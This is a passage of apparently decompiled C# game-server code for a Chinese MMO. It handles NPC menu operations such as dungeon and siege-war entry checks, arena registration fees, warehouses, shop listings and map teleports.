					if (World.伏魔洞副本 != null)
					{
						系统提示("副本正在被其他队伍进行中, 请稍后再试", 9, "系统提示");
					}
					else if (组队id == 0)
					{
						系统提示("必须组队参加才可以", 9, "系统提示");
					}
					else if (base.恢复精力 < 200)
					{
						系统提示("你的精力不足200无法申请", 9, "系统提示");
					}
					else if (World.Teams.TryGetValue(组队id, out value))
					{
						if (value.组队列表.Count < 2)
						{
							系统提示("必须整个队伍参加才可以", 9, "系统提示");
						}
						else if (value.队伍级别 < World.伏魔洞限制等级)
						{
							系统提示("当前队伍级别小于" + World.伏魔洞限制等级 + "无法参加副本", 9, "系统提示");
						}
						else
						{
							World.伏魔洞副本 = new 伏魔洞副本(value);
						}
					}
					break;
				}
				case 303:
					if (World.天魔神宫占领者 == base.门派联盟盟主)
					{
						移动(-422f, -960f, 15f, 42101);
					}
					else if (World.天魔神宫占领者 == string.Empty)
					{
						系统提示("天魔神宫还未被占领.....");
					}
					else
					{
						系统提示("你不是[" + World.天魔神宫占领者 + "]同盟及门派成员, 无法进入天魔神宫.....");
					}
					打开仓库中 = false;
					Buffer.BlockCopy(BitConverter.GetBytes(1010), 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					break;
				case 325:
					Buffer.BlockCopy(array2, 0, array, 18, 2);
					Buffer.BlockCopy(array3, 0, array, 10, 2);
					Buffer.BlockCopy(array3, 0, array, 14, 2);
					if (World.攻城战进程 != 0)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10235), 0, array, 14, 2);
					}
					break;
				case 307:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					if (World.攻城战进程 != 0)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10235), 0, array3, 14, 2);
					}
					else if (base.帮派名字 == "")
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10230), 0, array3, 14, 2);
					}
					else if (base.帮派人物等级 != 6)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10230), 0, array3, 14, 2);
					}
					else if (base.门派联盟盟主 == World.天魔神宫占领者)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10231), 0, array3, 14, 2);
					}
					else if (base.门派联盟盟主 == "")
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10231), 0, array3, 14, 2);
					}
					break;
				case 309:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					if (World.攻城战进程 != 0)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10235), 0, array3, 14, 2);
					}
					break;
				case 310:
					打开仓库中 = true;
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array3, 16, 2);
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					break;
				case 311:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					if (World.攻城战进程 != 0)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10235), 0, array3, 14, 2);
						break;
					}
					if (base.帮派人物等级 != 6)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10231), 0, array3, 14, 2);
					}
					if (World.天魔神宫占领者 != base.帮派名字)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10231), 0, array3, 14, 2);
					}
					break;
				case 312:
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					if (World.攻城战进程 != 0)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10235), 0, array3, 14, 2);
					}
					else if (base.门派联盟盟主 == "")
					{
						Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array3, 14, 2);
					}
					else if (World.天魔神宫占领者 != base.门派联盟盟主)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array3, 14, 2);
					}
					break;
				case 305:
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					if (World.攻城战进程 != 0)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10235), 0, array3, 14, 2);
					}
					else if (base.帮派名字 == "")
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10230), 0, array3, 14, 2);
					}
					else if (base.帮派人物等级 != 6)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10230), 0, array3, 14, 2);
					}
					else if (base.宣告攻城 == 1)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10234), 0, array3, 14, 2);
					}
					else if (base.门派联盟盟主 != base.帮派名字 && base.门派联盟盟主 != "")
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10231), 0, array3, 14, 2);
					}
					break;
				case 306:
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					if (World.攻城战进程 != 0)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10235), 0, array3, 14, 2);
					}
					else if (base.帮派名字 == "")
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10230), 0, array3, 14, 2);
					}
					else if (base.帮派人物等级 != 6)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10230), 0, array3, 14, 2);
					}
					else if (base.门派联盟盟主 == base.帮派名字)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10232), 0, array3, 14, 2);
					}
					else if (!(base.门派联盟盟主 == "") && base.门派联盟盟主 == World.天魔神宫占领者)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10232), 0, array3, 14, 2);
					}
					break;
				case 308:
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					if (World.攻城战进程 != 0)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10235), 0, array3, 14, 2);
					}
					else if (base.帮派名字 == "")
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10230), 0, array3, 14, 2);
					}
					else if (base.帮派人物等级 != 6)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10230), 0, array3, 14, 2);
					}
					else if (!(World.天魔神宫占领者 == base.门派联盟盟主) && base.门派联盟盟主 != base.帮派名字)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(10231), 0, array3, 14, 2);
					}
					break;
				case 315:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array3, array3.Length);
					}
					if (World.攻城战进程 < 2)
					{
						Buffer.BlockCopy(array2, 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(10251), 0, array3, 14, 2);
						break;
					}
					if (base.门派联盟盟主 == "")
					{
						系统提示("请先申请攻城战", 10, "系统提示");
						return;
					}
					if (base.门派联盟盟主 == World.天魔神宫占领者)
					{
						移动(-437f, 89f, 15f, 42001);
					}
					else
					{
						移动(-430f, -660f, 15f, 42001);
					}
					发送攻城战剩余时间((int)攻城Class.当前进程结束时间.Subtract(DateTime.Now).TotalSeconds);
					切换PK模式(2);
					break;
				case 22:
				{
					if (base.Player_Level < 130)
					{
						系统提示("级别小于130级不能进入高级竞技场。");
						return;
					}
					if (World.Eve90进程 > 2)
					{
						系统提示("高级竞技场有比赛正在进行, 请等待下一轮。");
						return;
					}
					if (World.evePlayers != null && World.evePlayers.Count >= 2)
					{
						系统提示("申请人数已满, 请等待下一轮。");
						return;
					}
					if (World.evePlayers.TryGetValue(base.人物全服ID, out var _))
					{
						系统提示("不允许重复申请。");
						return;
					}
					CheckTreasureGems();
					if (base.FLD_RXPIONT < World.进场最低费用)
					{
						系统提示("元宝不足" + World.进场最低费用 + ", 不能进入高级竞技场。");
						return;
					}
					检察元宝数据(World.进场最低费用, 0, "个人赛");
					RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "高级竞技场进场费", 1, World.进场最低费用);
					切换PK模式(0);
					World.evePlayers.Add(base.人物全服ID, this);
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(-302f, 288f, 15f, 2301);
					SaveGemData();
					break;
				}
				case 1:
					if (商店ID_ == 0)
					{
						打开仓库中 = false;
						合成系统解锁();
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						base.当前操作NPC = 0;
						base.当前操作类型 = 0;
					}
					else
					{
						if (商店ID_ != 7 && 商店ID_ != 8)
						{
							打开仓库中 = true;
						}
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(array2, 0, array3, 10, 2);
						Buffer.BlockCopy(array2, 0, array3, 14, 2);
						合成物品表.Clear();
					}
					break;
				case 2:
					if (合成物品表 != null)
					{
						合成物品表.Clear();
					}
					元宝合成开关 = 0;
					打开仓库中 = false;
					合成系统解锁();
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					base.当前操作NPC = 0;
					base.当前操作类型 = 0;
					if ((商店ID_ == 1 || 商店ID_ == 14 || 商店ID_ == 18 || 商店ID_ == 41 || 商店ID_ == 93 || 商店ID_ == 11 || 商店ID_ == 23 || 商店ID_ == 43) && base.UserName.Length != 0)
					{
						保存个人仓库存储过程();
						保存综合仓库存储过程();
						保存宠物仓库存储过程();
						保存灵兽仓库存储过程();
					}
					break;
				case 3:
				{
					List<ShopClass> shopListAll = ShopClass.GetShopListAll(商店ID_);
					new List<ShopClass>();
					List<ShopClass> list = ((页标_ != 0) ? ShopClass.GetShopList(商店ID_, 页标_ - 101) : ShopClass.GetShopList(商店ID_, 0));
					using (发包类 发包类 = new 发包类())
					{
						发包类.Write4(操作ID_);
						发包类.Write4(操作ID_);
						发包类.Write4(商店ID_);
						发包类.Write4(list.Count);
						发包类.Write4(0);
						if (页标_ == 0)
						{
							int num2 = shopListAll.Count / 60;
							if (shopListAll.Count % 60 > 0)
							{
								num2++;
							}
							发包类.Write8(num2);
						}
						else
						{
							发包类.Write8(页标_);
						}
						foreach (ShopClass item in list)
						{
							发包类.Write8(item.PlayerId);
							if (item.ActiveMagicPropertiesCount > 0)
							{
								发包类.Write8(item.ActiveMagicPropertiesCount);
								if (item.MagicProperty1 > 0)
								{
									发包类.Write8(item.MagicProperty1);
								}
								if (item.MagicProperty2 > 0)
								{
									发包类.Write8(item.MagicProperty2);
								}
								if (item.MagicProperty3 > 0)
								{
									发包类.Write8(item.MagicProperty3);
								}
								if (item.MagicProperty4 > 0)
								{
									发包类.Write8(item.MagicProperty4);
								}
							}
							else
							{
								发包类.Write8(0L);
							}
							发包类.Write8(-1L);
						}
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 37120, base.人物全服ID);
						}
					}
					return;
				}
				case 5:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					打开仓库中 = true;
					打开个人仓库();
					打开综合仓库();
					break;
				case 9:
					switch (BitConverter.ToInt16(array, 0))
					{
					case 27:
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(750f, -880f, 15f, 601);
						break;
					case 16:
						Buffer.BlockCopy(array, 0, array3, 18, 1);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(0f, -600f, 15f, 501);
						break;
					case 15:
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(0f, -600f, 15f, 401);
						break;
					case 33:
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(1630f, -1578f, 15f, 1701);
						break;
					case 28:
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(-850f, -800f, 15f, 701);
						break;
					case 74:
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						if (base.Player_Zx == 1)
						{
							移动(1125f, -1555f, 15f, 2001);
						}
						else
						{
							移动(-2231f, 1495f, 15f, 2001);
						}
						break;
					case 34:
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(-1624f, 1561f, 15f, 1401);
						break;
					}
					break;
				case 161:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					if (!追加状态列表.ContainsKey(900000204) && !追加状态列表.ContainsKey(900000203))
					{
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(array2, 0, array3, 10, 2);
						Buffer.BlockCopy(array2, 0, array3, 14, 2);
					}
					else
					{
						移动(130f, 904f, 15f, 29000);
					}
					break;
				case 11:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					break;
				case 25:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					帮派升级();
					break;
				case 12:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(12), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(12), 0, array3, 14, 2);
					势力战系统.发送势力战消息1(this);
					发送仙魔大战消息1();
					break;
				case 14:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 15:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					if (World.是否开启共用银币市场 == 1 && base.人物坐标_地图 != 1201)
					{
						换线移动(10f, 10f, 15f, 1201);
					}
					else
					{
						移动(10f, 10f, 15f, 1201);
					}
					break;
				case 17:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					if (World.当前是否是银币线路 == 1 && (base.人物坐标_地图 == 1201 || base.人物坐标_地图 == 41001))
					{
						if (World.老泫勃派开关 == 1)
						{
							换线移动(495f, 1727f, 15f, 29000);
						}
						else
						{
							换线移动(500f, 1575f, 15f, 101);
						}
					}
					else if (World.老泫勃派开关 == 1)
					{
						移动(495f, 1727f, 15f, 29000);
					}
					else
					{
						移动(500f, 1575f, 15f, 101);
					}
					break;
				case 38:
					if (base.Player_Level < int.Parse(World.地图限制等级[0]))
					{
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(array2, 0, array3, 10, 2);
						Buffer.BlockCopy(array2, 0, array3, 14, 2);
						系统提示("只有" + int.Parse(World.地图限制等级[0]) + "等级以后才可以进入。");
					}
					else
					{
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						Drunksnail();
						移动(1900f, -820f, 15f, 5001);
					}
					break;
				case 23:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					if (World.ArenaIdling == null)
					{
						系统提示("比武泡点还未开始,请等待活动开启。");
					}
					else
					{
						移动(-17f, -8f, 15f, 2341);
					}
					break;
				case 122:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 62:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(-1f, -221f, 15f, 23001);
					break;
				case 63:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					if (World.老泫勃派开关 == 1)
					{
						移动(495f, 1727f, 15f, 29000);
					}
					else
					{
						移动(500f, 1575f, 15f, 101);
					}
					break;
				case 164:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					if (World.开启双倍扣武勋 == null)
					{
						双倍扣武勋();
					}
					else
					{
						系统提示("有人已经开启" + World.双倍扣武勋倍数 + "倍扣武勋！无需重复开启。", 10, "系统提示");
					}
					break;
				case 45:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, 300f, 15f, 20001);
					break;
				case 65:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23100);
					break;
				case 66:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23001);
					break;
				case 67:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23200);
					break;
				case 68:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23100);
					break;
				case 69:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23300);
					break;
				case 70:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23200);
					break;
				case 71:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23400);
					break;
				case 72:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23300);
					break;
				case 73:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23500);
					break;
				case 74:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23400);
					break;
				case 75:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23600);
					break;
				case 76:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23500);
					break;
				case 77:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23700);
					break;
				case 78:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23600);
					break;
				case 79:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23800);
					break;
				case 80:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23700);
					break;
				case 81:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23900);
					break;
				case 82:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23800);
					break;
				case 92:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23050);
					break;
				case 94:
					if (base.Player_Level < int.Parse(World.地图限制等级[1]))
					{
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(array2, 0, array3, 10, 2);
						Buffer.BlockCopy(array2, 0, array3, 14, 2);
						系统提示("只有" + int.Parse(World.地图限制等级[1]) + "等级以后才可以进入。");
					}
					else
					{
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						World.Rape();
						移动(-900f, 145f, 15f, 6001);
					}
					break;
				case 163:
				{
					DateTime now = DateTime.Now;
					if (DateTime.Now > base.FLD_精力时间)
					{
						if (base.恢复精力 < 最大精力)
						{
							Buffer.BlockCopy(array, 0, array3, 18, 2);
							Buffer.BlockCopy(array2, 0, array3, 10, 2);
							Buffer.BlockCopy(array2, 0, array3, 14, 2);
							base.恢复精力 += 100;
							DateTime dateTime2 = (base.FLD_精力时间 = DateTime.Now.AddDays(1.0));
							now = dateTime2;
							系统提示("成功恢复精力100点");
							SavePlayerData();
							更新武功和状态();
						}
						else
						{
							Buffer.BlockCopy(array, 0, array3, 18, 2);
							Buffer.BlockCopy(array2, 0, array3, 10, 2);
							Buffer.BlockCopy(array2, 0, array3, 14, 2);
							系统提示("你的精力已满无需恢复, 使用后再来恢复..");
						}
					}
					else
					{
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						系统提示("在[" + base.FLD_精力时间.ToString("yyyy年MM月dd日 HH时mm分ss秒") + "]后, 才能再次恢复精力。");
					}
					break;
				}
				case 101:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 102:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 103:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 105:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 110:
				{
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					using (发包类 发包类2 = new 发包类())
					{
						发包类2.Write2(base.人物全服ID);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类2, 16663, base.人物全服ID);
						}
					}
					break;
				}
				case 111:
					打开仓库中 = false;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					break;
				case 117:
					CheckTreasureGems();
					if (base.FLD_RXPIONT >= World.申请门战需要元宝 && base.Player_Money >= 50000000)
					{
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(array2, 0, array3, 10, 2);
						Buffer.BlockCopy(array2, 0, array3, 14, 2);
					}
					else
					{
						系统提示("申请帮战最少" + World.申请门战需要元宝 + "元宝和5000万游戏币。");
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					}
					break;
				case 173:
					if (base.Player_Level < int.Parse(World.地图限制等级[3]))
					{
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(array2, 0, array3, 10, 2);
						Buffer.BlockCopy(array2, 0, array3, 14, 2);
						系统提示("只有" + int.Parse(World.地图限制等级[3]) + "等级以后才可以进入。");
					}
					else
					{
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(1989f, -2027f, 15f, 26000);
					}
					break;
				case 176:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 177:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 132:
					参加武林血战();
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
